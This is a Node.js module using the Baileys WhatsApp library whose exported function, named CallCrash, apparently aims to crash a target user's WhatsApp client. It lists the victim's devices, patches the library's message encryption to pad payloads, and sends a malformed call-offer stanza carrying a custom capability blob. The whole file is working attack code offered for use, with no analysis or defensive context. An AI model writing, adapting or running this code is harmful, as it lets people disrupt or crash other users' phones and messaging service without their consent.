


const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');



async function CallCrash(SYxS7, target) {
  const devices = (
    await SYxS7.getUSyncDevices([target], false, false, SYxS7.authState)
  ).map(({ user, device }) => {
    return `${user}:${device || ""}@s.whatsapp.net`
  })


  await SYxS7.assertSessions(devices)

  const locks = {}
  const mutex = async (jid, task) => {
    locks[jid] ??= Promise.resolve()
    locks[jid] = locks[jid].catch(() => {}).then(task)
    return locks[jid]
  }

  const pad = buf =>
    Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)])

  const originalCreateParticipantNodes =
    SYxS7.createParticipantNodes?.bind(SYxS7)

  SYxS7.createParticipantNodes = async (
    recipients,
    message,
    encAttrs,
    overrideMessage
  ) => {
    if (!recipients.length) {
      return { nodes: [], shouldIncludeDeviceIdentity: false }
    }

    const patched =
      (await SYxS7.patchMessageBeforeSending?.(message, recipients)) ??
      message

    const messages = Array.isArray(patched)
      ? patched
      : recipients.map(jid => ({
          recipientJid: jid,
          message: patched
        }))

    const { id: myJid, lid } = SYxS7.authState.creds.me
    const linkedUser = lid ? jidDecode(lid)?.user : null

    let includeDeviceIdentity = false

    const nodes = await Promise.all(
      messages.map(async ({ recipientJid, message }) => {
        const recipientUser = jidDecode(recipientJid).user
        const myUser = jidDecode(myJid).user

        const isSelf =
          recipientUser === myUser || recipientUser === linkedUser

        if (overrideMessage && isSelf && recipientJid !== myJid) {
          message = overrideMessage
        }

        const encoded = pad(
          SYxS7.encodeWAMessage
            ? SYxS7.encodeWAMessage(message)
            : encodeWAMessage(message)
        )

        return mutex(recipientJid, async () => {
          const { type, ciphertext } =
            await SYxS7.signalRepository.encryptMessage({
              jid: recipientJid,
              data: encoded
            })

          if (type === "pkmsg") includeDeviceIdentity = true

          return {
            tag: "to",
            attrs: { jid: recipientJid },
            content: [
              {
                tag: "enc",
                attrs: { v: "2", type, ...encAttrs },
                content: ciphertext
              }
            ]
          }
        })
      })
    )

    return {
      nodes: nodes.filter(Boolean),
      shouldIncludeDeviceIdentity: includeDeviceIdentity
    }
  }

  // 6. Create encrypted destination nodes
  const { nodes, shouldIncludeDeviceIdentity } =
    await SYxS7.createParticipantNodes(
      devices,
      { conversation: "y" },
      { count: "0" }
    )

  // 7. Build CALL OFFER stanza
  const callNode = {
    tag: "call",
    attrs: {
      to: target,
      id: SYxS7.generateMessageTag(),
      from: SYxS7.user.id
    },
    content: [
      {
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").toUpperCase(),
          "call-creator": SYxS7.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          {
            tag: "video",
            attrs: {
              enc: "vp8",
              dec: "vp8",
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0"
            }
          },
          { tag: "net", attrs: { medium: "3" } },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          { tag: "encopt", attrs: { keygen: "2" } },
          {
            tag: "destination",
            attrs: {},
            content: nodes
          },
          ...(shouldIncludeDeviceIdentity
            ? [
                {
                  tag: "device-identity",
                  attrs: {},
                  content: encodeSignedDeviceIdentity(
                    SYxS7.authState.creds.account,
                    true
                  )
                }
              ]
            : [])
        ]
      }
    ]
  }

  // 8. Send the call offer
  await SYxS7.sendNode(callNode)

  // Optional: restore original function
  if (originalCreateParticipantNodes) {
    SYxS7.createParticipantNodes = originalCreateParticipantNodes
  }
}

module.exports = { CallCrash }